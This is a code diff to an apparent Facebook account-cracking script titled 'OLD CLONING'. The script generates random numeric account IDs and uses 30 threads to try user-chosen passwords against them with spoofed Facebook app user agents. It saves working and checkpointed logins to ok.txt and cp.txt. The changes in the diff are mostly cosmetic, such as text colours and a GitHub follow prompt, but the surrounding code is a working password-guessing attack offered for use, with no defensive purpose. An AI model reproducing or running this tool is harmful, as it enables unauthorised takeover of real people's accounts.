@@ -128,7 +128,7 @@ logo = ("""\033[1;32m
 \033[1;37m AUTHOR  : \033[1;32mTONMOY MAHATO                                                          
 \033[1;37m GITHUB   : \033[1;32mtonmoy404-cyber                                                             
 \033[1;37m YOU TUBE  : \033[1;32mTONMOY MAHATO                                                          
-\033[1;37m TOOL   : \033[1;32m OLD CLONING                                                                       
+\033[1;37m TOOL  : \033[1;32mOLD CLONING                                                                       
 \033[1;37m ══════════════════════════════════════════════════""")
 
 class Main:
@@ -141,7 +141,7 @@ class Main:
 		print(logo)
 		print("")
 		print("")
-		print("\033[1;31m [1] \033[1;37mFirst \033[1;32mRules  ")
+		print("\033[1;31m [1] \033[1;37mFirst Follow my\033[1;32m GitHub Account  ")
 		print("\033[1;31m [2] \033[1;37mEx\033[1;32mit")
 		print("")
 		Baloch = input("\n\033[1;37m  Cho\033[1;32mse--> \033[1;32m")
@@ -151,11 +151,8 @@ class Main:
 			print("    Thanks")
 			exit()
 		elif Baloch in ["1", "01"]:
-			os.system("https://youtube.com/channel/UCzc-ArnXynlC_QjrDWCQ9egr")
+			os.system("https://github.com/tonmoy404-cyber")
 			print("")
-			time.sleep(2.0)
-			print("")
-			print("\033[1;32m Successful Bro")
 			time.sleep(2.0)
 			os.system("clear")
 		print(logo)
@@ -177,7 +174,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;97m TOTAL IDS TO \033[1;32mCRACK LIMIT 50,000: "))
+		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -186,19 +183,19 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] \033[1;37mUSE (123456-1234567\033[1;32m-123456789) FOR IDZ\033[1;37m ")
-				listpass = input("%s [?] \033[1;37mENTER \033[1;32mPASSWORD :%s "%(G))
+				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] \033[1;37mPASSWORD MINIMUM \033[1;32m6 CHARACTERS"%(B))
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s [+] \033[1;37mOK RESULTS \033[1;32mSAVED IN -> ok.txt"%(Y))
-				print("%s [+] \033[1;37mCP RESULTS \033[1;32mSAVED IN -> cp.txt"%(G))
-				print("%s [!] \033[1;31mIF NO RESULT USE AIRPLANE MODE \033[1;32m5 SECONDS\x1b[0m\n"%(P))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
+				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n [>>] \033[1;37mCRACK \033[1;32mCOMPLETE...")
+			exit("\n\n [>>] CRACK COMPLETE...")
 		except Exception as e:exit(str(e))
 
 	def api(self, uid, pwx):
@@ -567,7 +564,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r \033[1;34m[ TONMOY ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ TONMOY ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
